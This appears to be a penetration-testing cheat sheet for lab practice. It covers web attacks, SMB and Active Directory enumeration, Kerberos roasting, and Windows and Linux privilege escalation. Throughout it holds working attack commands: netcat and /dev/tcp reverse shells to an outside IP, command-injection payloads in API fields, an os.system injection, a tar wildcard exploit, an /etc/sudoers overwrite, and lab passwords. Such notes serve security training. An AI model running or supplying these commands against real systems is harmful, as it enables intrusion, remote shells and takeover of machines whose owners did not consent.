python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

# Remote dynamic port forwarding
ssh -N -R 9998 kali@192.168.118.4
```

# Web Attacks
## Checklist
- Gobuster
- Feroxbuster
  - phpinfo.php --> check "DOCUMENT_ROOT"
- nikto
- curl -v
- burp suite
- subdomain using wfuzz
- USE BURP!! when logging in:: admin:admin admin:password admin:null
  - Check cookie(urldecode -> base64decode)
- CMS exploit
- View page/page sources
- Local File Inclusion
  - Click stuff to find out if we can find this ?file, ?page
  - ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami
- POST/GET with burp suite
- Any .config, .conf files?
- Combination with SQLi and other webpage that we know wehre its root location is

## General Tips
- Try "Jetty exploit", "Jetty RCE", "Jetty Remote Code Execution"...
- Open the website and view page/page sources
  - gobuster: wait until it is finished since some important directories show up later!(ex. /under_construction)
  - feroxbuster
  - run nikto
- We should try both POST and GET request using the key variable(ex. UC404)
  - Try with GET request
    - http://192.168.x.x/api?var=whoami
    - http://192.168.x.x/api?var=%0awhoami
    - http://192.168.x.x/api?var=;whoami
  - Try with POST request
    - Intercept the request with Burp Suite
- WAF bypass: X-Forwarded-For:127.0.0.1
- When we're dealing with python server, see if we can use os module and send "nc 192.168.45.175 80 -e /bin/sh" when we find data entry

## API Response
```bash
# curl -v can give you more information about this api
curl -v http://192.168.x.x:port

# Try sending get request to any found apis with found or possible argument
http://192.168.183.117:50000/verify?code=os

# Try sending post request to any found apis
curl -X post --data "code=2*2" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
curl -X post --data "code=os.system('nc 192.168.45.175 80 -e /bin/sh')" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;nc 192.168.45.175 80 -e /bin/bash"}' -H 'Content-Type: application/json'  http://192.168.222.134:13337/update
```

## Filemanager
- See if any directory is showing same contents as ohter ports like FTP, SMB
- If our key file we should obtain is php file, we can't read it on the web so likely that we need to transfer it to FTP,SMB so make sure if any directory can be searched through smb/ftp
- When we're changing download path, try ./Documents/ or /Documents/ or Documents/

## Input Form
- SQLi? Command injection?
- Try with GET request
  - http://192.168.x.x/api?var=whoami
  - http://192.168.x.x/api?var=%0awhoami
  - http://192.168.x.x/api?var=;whoami
- Try with POST request
  - Intercept the request with Burp Suite

## Directory Traversal
- Make sure to read and try exploit codes' examples
- Use curl --path-as-is or burp suite
- Check .ssh directory
- Check if we can read other vulnerable app's config file through this vulnerability
- Check other user's home directories to see the name of the files(pg practice cassandra)
- If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)

## Local File Inclusion
- Make sure to check "important files" list
- Make sure to see what files we can find using wfuzz on our current location
  - Make sure to check file extension(.py, .js, .conf, .config...)
```bash
# Local File Inclusion...
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
```

## PHP File Upload Bypass
```bash
echo "AddType application/x-httpd-php .xxx" > htaccess
```


# SMB
```bash
# nmap
nmap 10.10.10.175 --script=smb-enum* -p445

# bloodhound : after discovering valid user credentials and we can't winrm...! so useful
bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all

#crackmapexec(smb/winrm)
crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local

# smbclient
## Even when it says the user can only read, TRY uploading something anyway!

## anon
smbclient -L 10.10.10.175 -N
smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.local/fsmith"

> recurse on
> prompt off
> ls


# dns
dig @10.10.10.161 AXFR htb.local
dnsenum 192.168.162.122

# smbmap
smbmap -H 10.10.10.161
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -u 'guest' -p ''
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5


# enum4linux
enum4linux -a -u "" -p "" dc-ip
enum4linux -a -u "guest" -p "" dc-ip


# rpcclient
## anon
rpcclient 10.10.10.175 -N
rpcclient -U "" -N 10.10.10.161
> enumdomusers
> enumdomgroups


# LDAP
## anon
ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"


# kerbrute
## anon
./kerbrute userenum -d heist.offsec --dc 192.168.243.165 /PATH/TO/FILE/<USERNAMES>


# GetADUsers
impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192



# GetNPUsers.py(18200)
- without providing anything.
impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/
GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
GetNPUsers.py active.htb/ -dc-ip 10.10.10.100


- with potential usernames.txt
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

- with username whos "Do not require Kerberos preauthentication" is enabled (## This will get us dave's TGT if his pre-authentication)
impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/dave -no-pass
impacket-GetNPUsers Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>

- with valid credentials(pete/Nexus123!) this will return a user's TGT ticket whos "Do not require Kerberos preauthentication" is enabled.
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete (#this requires pete's password for us to be able to get dave's TGT)

### with username list
impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/ -usersfile usernames.txt
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

# Kerberoast(requires valid credentials) 13100
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

# Active Directory
## Important Security Groups And Exploit
**Backup Operators**
```bash


```

**Account Operators**
```bash
# Users in this group can create or modify other accounts in the domain
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```

**Server Operators**
```bash
Users can administer Domain Controllers. They cannot change any administrative group memberships.
```



# Windows Privilege Escalation

## Manual Enumeration
```bash
#User information&hostname
whoami
whoami /priv
whoami /groups
whoami /all
net user attacker | find "Local Group"
  -> If user is a member of administrators maybe UACME will be required

#Existing users and groups
net user
  Get-LocalUser
net localgroup
  Get-LocalGroup
net localgroup adminteam
  Get-LocalGroupMember adminteam

#System information
systeminfo

#IP
ipconfig /all

#Routing table
route print

#Active network
netstat -ano

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# cmdkey /list

#Installed Applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Installed Applications inside of Program Files
C:\Program Files\...
=============================================== Common Program Files ====================================================
02/16/2021  10:27 PM    <DIR>          .
02/16/2021  10:27 PM    <DIR>          ..
11/04/2020  04:08 AM    <DIR>          Common Files
11/03/2020  08:34 PM    <DIR>          internet explorer
11/03/2020  09:37 PM    <DIR>          MSBuild
11/03/2020  09:37 PM    <DIR>          Reference Assemblies
02/16/2021  10:27 PM    <DIR>          VMware
12/08/2020  07:22 PM    <DIR>          Windows Defender
12/08/2020  07:22 PM    <DIR>          Windows Defender Advanced Threat Protection
09/14/2018  11:19 PM    <DIR>          Windows Mail
11/03/2020  08:34 PM    <DIR>          Windows Media Player
09/14/2018  11:19 PM    <DIR>          Windows Multimedia Platform
09/14/2018  11:28 PM    <DIR>          windows nt
11/03/2020  08:34 PM    <DIR>          Windows Photo Viewer
09/14/2018  11:19 PM    <DIR>          Windows Portable Devices
09/14/2018  11:19 PM    <DIR>          Windows Security
09/14/2018  11:19 PM    <DIR>          WindowsPowerShell

C:\Program Files (x86)\...
=============================================== Common Program Files (x86) ====================================================
11/03/2020  09:37 PM    <DIR>          .
11/03/2020  09:37 PM    <DIR>          ..
09/14/2018  11:28 PM    <DIR>          Common Files
11/03/2020  08:34 PM    <DIR>          Internet Explorer
09/14/2018  11:19 PM    <DIR>          Microsoft.NET
11/03/2020  09:37 PM    <DIR>          MSBuild
11/03/2020  09:37 PM    <DIR>          Reference Assemblies
12/08/2020  07:22 PM    <DIR>          Windows Defender
09/14/2018  11:19 PM    <DIR>          Windows Mail
11/03/2020  08:34 PM    <DIR>          Windows Media Player
09/14/2018  11:19 PM    <DIR>          Windows Multimedia Platform
09/14/2018  11:28 PM    <DIR>          windows nt
11/03/2020  08:34 PM    <DIR>          Windows Photo Viewer
09/14/2018  11:19 PM    <DIR>          Windows Portable Devices
09/14/2018  11:19 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              15 Dir(s)  11,086,475,264 bytes free


#Running processes
Get-Process

#Juicy files
Get-ChildItem -Path C:\ -Include *.kdbx,*.htpasswd -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig,*.config -File -Recurse -ErrorAction SilentlyContinue
Check every user's directory && desktop && documents && downloads

dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath
  type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Users\Public\Transcript...

```

## Service Binary Hijacking
```bash

# Get a list of all installed windows services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
sc query | findstr /i servname

# Check StartMode
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.State -like 'Running'}
sc qc servicename

# Search for Modifiable services/executables with PowerUP.ps1
. .\PowerUp.ps1
Get-ModifiableServiceFile

icacls "C:\xampp\apache\bin\httpd.exe"

#restart service
net stop service && net start service
Restart-Service service

#When we can't restart the service but we have seshutdown privilege
shutdown /r /t 0

```

## Service DLL Hijacking
```bash
```

## Scheduled Tasks
```bash
# Scheduled tasks: Check Process || query schtasks
Get-ScheduledTask
schtasks /query /fo LIST /v
Get-Process
  Focus on Last Run Time, Next Run Time, Run As User Task To Run
  Check executable path with icacls to see if we can replace the exe file

# Or Find Process with Watch-Command.ps1 https://github.com/markwragg/PowerShell-Watch/blob/master/README.md
> . .\Watch-Command.ps1
> Watch-Command -ScriptBlock { Get-Process }

```

## Unquoted Service Paths
```bash
```

# Linux Privilege Escalation
## Linux Manual Enumeration

```bash
# User context
id
hostname

# Search for flags
find / -type f -name 'local.txt' 2>/dev/null
find / -type f -name 'proof.txt' 2>/dev/null

# Check User files(Everyone if you can)
cat /home/user/.bash_aliases
cat /home/user/.bash_history

# Check config files
/var/www/html/sites/default/config.php

# Enumerate other userse(This is really important because we might have to pivot to other users)
cat /etc/passwd

# Operating system release and version
cat /etc/issue
cat /etc/os-release

# Kernel version and architecture
uname -a

# Running process
ps aux
ps auxwww

# Network interface
ip a

# Route
routel

# Active network connections
ss -anp

# Firewall rule
cat /etc/iptables/rules.v4

# Cronjob
ls -lah /etc/cron*
cat /etc/crontab
crontab -l

# Installed applications
dpkg -l

# Every directory writable by the current user
find / -writable -type d 2>/dev/null

# SUID-marked binaries
find / -perm -u=s -type f 2>/dev/null

# List all mounted filesystems
mount

# List all drives that will be mounted at boot time
cat /etc/fstab

# List all available disks
lsblk
```

## Linux Privilege Strategy
- Run linpeas and check every file that's red
- Run pspy to see if we're missing anything
- When current user can't use wget that probably means we need to pivot as someone else
- See if other person can ssh as root(check important files such as .bash_history, .bash_aliases)
- If the current user can run webserver on victim machine, it's likely that we can only access that port on the same machine
- Check what's running on local port
- Check suggested conf, config files from linpeas
- Check what's on /opt directory
- Check mail in /var/mail /var/spool/mail

## Common Linux Privilege Escalation

### Exploit tar with wilrdcard
```bash
echo "/bin/bash -c '-i >& /dev/tcp/192.168.45.175/80 0>&1" > shell.sh
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=bash shell.sh"
```

### Edit /etc/sudoers
```bash
exec_command(‘echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers’)
```

### Exploit 7z with wildcard && check error messages
```bash
touch @enox.zip
ln -s /root/secret enox.zip
```
